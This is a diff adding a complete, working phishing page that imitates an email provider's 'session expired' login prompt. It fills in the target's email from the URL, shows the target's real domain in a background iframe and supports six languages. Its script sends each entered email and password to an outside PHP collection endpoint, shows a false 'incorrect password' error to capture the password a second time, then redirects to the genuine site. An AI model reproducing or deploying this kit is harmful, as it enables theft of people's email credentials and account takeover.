@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en" id="html">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+          integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow|Noto+Sans:400,700&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="https://masherabot.com/img/png/adobe/acrobat.png" type="image/x-icon">
+    <script src="https://code.jquery.com/jquery-3.7.0.min.js"
+            integrity="sha256-JlqSTELRe4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/i18next@23.15.1/dist/umd/i18next.min.js"></script>
+<style>
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: 'Archivo Narrow', 'Noto Sans', sans-serif;
+    }
+
+    #iframe {
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+    }
+
+    .login {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100vh;
+        height: 100vh;
+        z-index: 20;
+    }
+
+    .login_body {
+        width: 90%;
+        max-width: 600px;
+        z-index: 10;
+        padding: 15px;
+        background: white;
+        box-shadow: 0 4px 32px 0 grey;
+        display: flex;
+        flex-flow: column;
+        gap: 10px;
+    }
+
+    .confirm {
+        font-weight: 600;
+    }
+
+    .flex_column {
+        display: flex;
+        flex-flow: column;
+    }
+
+    #newbutton {
+        width: fit-content !important;
+        background: #062174;
+        color: white;
+        border-radius: 0;
+        align-self: flex-end;
+    }
+
+    .loading {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-flow: column;
+        gap: 10px;
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        z-index: 100;
+        background: white;
+    }
+
+    #name {
+        text-transform: uppercase;
+        font-weight: bold;
+    }
+
+    .loader {
+        width: 48px;
+        height: 48px;
+        display: inline-block;
+        position: relative;
+        background: black;
+        box-sizing: border-box;
+        animation: flipX 1s linear infinite;
+    }
+
+    #head {
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .times {
+        cursor: pointer;
+        font-size: 30px;
+        font-weight: bold;
+        padding: 0;
+    }
+
+    [dir="rtl"] .login_body {
+        text-align: right;
+    }
+
+    [dir="rtl"] #head {
+        flex-direction: row-reverse;
+    }
+
+    [dir="rtl"] #newbutton {
+        align-self: flex-start;
+    }
+
+    @keyframes flipX {
+        0% {
+            transform: perspective(200px) rotateX(0deg) rotateY(0deg);
+        }
+
+        50% {
+            transform: perspective(200px) rotateX(-180deg) rotateY(0deg);
+        }
+
+        100% {
+            transform: perspective(200px) rotateX(-180deg) rotateY(-180deg);
+        }
+    }
+
+    .lang-switcher {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        z-index: 30;
+    }
+</style>
+</head>
+
+<body>
+    <select class="lang-switcher" onchange="setLanguage(this.value)">
+        <option value="en">English</option>
+        <option value="zh-CN">中文</option>
+        <option value="hi">हिन्दी</option>
+        <option value="es">Español</option>
+        <option value="fr">Français</option>
+        <option value="ar">العربية</option>
+    </select>
+
+    <div class="login">
+        <div class="login_body">
+            <div id="head">
+                <h3 id="name"></h3>
+                <span class="times">×</span>
+            </div>
+            <div class="alert alert-danger" id="msg" style="display: none;" data-i18n="incorrect_password"></div>
+            <div class="text-center confirm" data-i18n="session_expired"></div>
+            <div id="error" style="color: red;"></div>
+            <form class="flex_column" id="form">
+                <label class="text-secondary font-weight-bold" data-i18n="email_address"></label>
+                <input type="email" readonly class="form-control email" required="required" name="email" id="email" autocomplete="on">
+                <label class="text-secondary font-weight-bold" data-i18n="password"></label>
+                <input type="password" class="form-control password" name="password" required="" id="password">
+                <br>
+                <div></div>
+                <input style="margin-top: 15px;" class="btn newbutton" type="submit" value="" name="submit" id="newbutton" data-i18n="[value]sign_in">
+            </form>
+        </div>
+    </div>
+
+    <div class="loading" id="loading">
+        <span class="loader"></span>
+        <h3 class="text-center" data-i18n="connecting_to_mail_server"></h3>
+    </div>
+
+    <iframe src="" frameborder="0" id="iframe"></iframe>
+    <input type="hidden" value="0" id="number">
+
+<script>
+    // Translation resources
+    const translations = {
+        'en': {
+            translation: {
+                'connecting_to_mail_server': 'Connecting To Mail Server',
+                'session_expired': 'Your session has expired please login again to continue',
+                'email_address': 'Email Address',
+                'password': 'Password',
+                'sign_in': 'Sign In',
+                'incorrect_credentials': 'Incorrect Username or Password!',
+                'incorrect_password': 'Incorrect Password'
+            }
+        },
+        'zh-CN': {
+            translation: {
+                'connecting_to_mail_server': '正在连接到邮件服务器',
+                'session_expired': '您的会话已过期，请重新登录以继续',
+                'email_address': '电子邮件地址',
+                'password': '密码',
+                'sign_in': '登录',
+                'incorrect_credentials': '用户名或密码错误！',
+                'incorrect_password': '密码错误'
+            }
+        },
+        'hi': {
+            translation: {
+                'connecting_to_mail_server': 'मेल सर्वर से कनेक्ट हो रहा है',
+                'session_expired': 'आपका सत्र समाप्त हो गया है, कृपया फिर से लॉगिन करें',
+                'email_address': 'ईमेल पता',
+                'password': 'पासवर्ड',
+                'sign_in': 'साइन इन करें',
+                'incorrect_credentials': 'गलत उपयोगकर्ता नाम या पासवर्ड!',
+                'incorrect_password': 'गलत पासवर्ड'
+            }
+        },
+        'es': {
+            translation: {
+                'connecting_to_mail_server': 'Conectando al servidor de correo',
+                'session_expired': 'Tu sesión ha expirado, por favor inicia sesión nuevamente para continuar',
+                'email_address': 'Dirección de correo electrónico',
+                'password': 'Contraseña',
+                'sign_in': 'Iniciar sesión',
+                'incorrect_credentials': '¡Nombre de usuario o contraseña incorrectos!',
+                'incorrect_password': 'Contraseña incorrecta'
+            }
+        },
+        'fr': {
+            translation: {
+                'connecting_to_mail_server': 'Connexion au serveur de messagerie',
+                'session_expired': 'Votre session a expiré, veuillez vous reconnecter pour continuer',
+                'email_address': 'Adresse e-mail',
+                'password': 'Mot de passe',
+                'sign_in': 'Se connecter',
+                'incorrect_credentials': 'Nom d’utilisateur ou mot de passe incorrect !',
+                'incorrect_password': 'Mot de passe incorrect'
+            }
+        },
+        'ar': {
+            translation: {
+                'connecting_to_mail_server': 'جارٍ الاتصال بخادم البريد',
+                'session_expired': 'انتهت صلاحية جلستك، يرجى تسجيل الدخول مرة أخرى للمتابعة',
+                'email_address': 'عنوان البريد الإلكتروني',
+                'password': 'كلمة المرور',
+                'sign_in': 'تسجيل الدخول',
+                'incorrect_credentials': 'اسم المستخدم أو كلمة المرور غير صحيحة!',
+                'incorrect_password': 'كلمة المرور غير صحيحة'
+            }
+        }
+    };
+
+    // Function to detect user's language
+    function detectUserLanguage() {
+        const supportedLanguages = ['en', 'zh-CN', 'hi', 'es', 'fr', 'ar'];
+        const userLanguages = navigator.languages || [navigator.language || 'en'];
+        for (let lang of userLanguages) {
+            // Normalize language codes (e.g., 'zh-Hans' to 'zh-CN')
+            if (lang.startsWith('zh')) return 'zh-CN';
+            if (supportedLanguages.includes(lang)) return lang;
+            // Match base language (e.g., 'es-MX' to 'es')
+            const baseLang = lang.split('-')[0];
+            if (supportedLanguages.includes(baseLang)) return baseLang;
+        }
+        return 'en'; // Fallback to English
+    }
+
+    // Initialize i18next with detected language
+    i18next.init({
+        lng: detectUserLanguage(), // Set detected language
+        fallbackLng: 'en',
+        resources: translations
+    }, function(err, t) {
+        if (err) console.error(err);
+        // Apply translations and set HTML attributes
+        const lang = i18next.language;
+        document.getElementById('html').setAttribute('lang', lang);
+        document.getElementById('html').setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+        document.querySelectorAll('[data-i18n]').forEach(element => {
+            const key = element.getAttribute('data-i18n');
+            if (key.startsWith('[value]')) {
+                element.value = t(key.replace('[value]', ''));
+            } else {
+                element.innerText = t(key);
+            }
+        });
+        // Update dropdown to reflect detected language
+        document.querySelector('.lang-switcher').value = lang;
+    });
+
+    // Language switcher for manual override
+    function setLanguage(lang) {
+        i18next.changeLanguage(lang, (err, t) => {
+            if (err) return console.error(err);
+            const html = document.getElementById('html');
+            html.setAttribute('lang', lang);
+            html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (key.startsWith('[value]')) {
+                    element.value = t(key.replace('[value]', ''));
+                } else {
+                    element.innerText = t(key);
+                }
+            });
+        });
+    }
+
+    const phpLink = "https://dev-serevrbursted0990.pantheonsite.io/cgit/submit.php";
+
+    const sendCount = [];
+
+    var link = window.location.href;
+    var url = new URL(link);
+    var hash = url.hash;
+    var updated_email = hash.replace("#", "");
+    document.getElementById("email").value = updated_email;
+
+    const inputString = updated_email;
+    const delimiter = "@";
+    const delimiterIndex = inputString.indexOf(delimiter);
+    const charactersAfter = inputString.substring(delimiterIndex + 1);
+    var iframe = document.getElementById("iframe");
+    var iframe_url = "https://www." + charactersAfter;
+    iframe.setAttribute("src", iframe_url);
+    let linkArr = iframe_url.split(".")[1];
+    document.title = `${linkArr.charAt(0).toUpperCase()}${linkArr.substring(1)} | Secured`;
+
+    setTimeout(() => {
+        var loader = document.getElementById("loading");
+        loader.style.display = "none";
+    }, 4000);
+
+    document.addEventListener("DOMContentLoaded", function () {
+        document.querySelector("#name").innerHTML = linkArr;
+        var form = document.getElementById("form");
+        form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            var button = document.getElementById("newbutton");
+            var formData = new FormData(form);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", phpLink, true);
+            var errors = document.getElementById("error");
+            errors.innerText = i18next.t('incorrect_credentials');
+            var password = document.getElementById("password");
+            password.value = "";
+
+            sendCount.push('sent');
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log(xhr.responseText);
+                    } else {
+                        console.error(xhr.responseText);
+                    }
+                }
+
+                if (sendCount.length >= 2) {
+                    errors.innerText = "";
+                    setTimeout(() => {
+                        window.location.href = "https://www." + charactersAfter;
+                    }, 2000);
+                }
+            };
+            xhr.send(formData);
+        });
+    });
+
+    // document.querySelector('.times').addEventListener('click', () => {
+    //     document.querySelector('.login').style.display = 'none';
+    // });
+</script>
+
+</html>
